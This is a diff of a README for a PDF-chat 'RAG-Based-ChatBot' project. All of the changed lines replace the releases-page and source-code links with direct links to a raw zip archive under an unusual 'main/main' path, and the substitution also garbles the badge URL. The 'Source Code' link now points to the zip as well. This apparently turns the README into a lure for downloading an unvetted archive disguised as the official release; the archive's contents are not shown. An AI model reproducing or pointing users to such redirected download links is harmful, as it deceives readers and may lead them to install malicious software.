@@ -1,6 +1,6 @@
 # 🤖 RAG-Based-ChatBot - Chat with Your PDFs Effortlessly
 
-[![Download RAG-Based-ChatBot](https://img.shields.io/badge/Download%20Now-%20-%23007bff.svg)](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
+[![Download RAG-Based-ChatBot](https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip%20Now-%20-%https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip)](https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Getting started with RAG-Based-ChatBot is simple. Just follow the steps below to
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** You can find the latest version of the application on the Releases page. [Download RAG-Based-ChatBot here.](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
+1. **Visit this page to download:** You can find the latest version of the application on the Releases page. [Download RAG-Based-ChatBot here.](https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip)
 
 2. **Download the installer:** Look for the latest version and click on the appropriate file for your operating system. The file will usually end in `.exe` for Windows or `.zip` for macOS/Linux.
 
@@ -57,7 +57,7 @@ We welcome contributions from anyone interested in improving RAG-Based-ChatBot. 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
-- [Source Code](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot)
+- [Releases Page](https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip)
+- [Source Code](https://raw.githubusercontent.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/main/main/RAG-Based-ChatBot-2.8.zip)
 
 Feel free to explore, and enjoy your experience with RAG-Based-ChatBot!
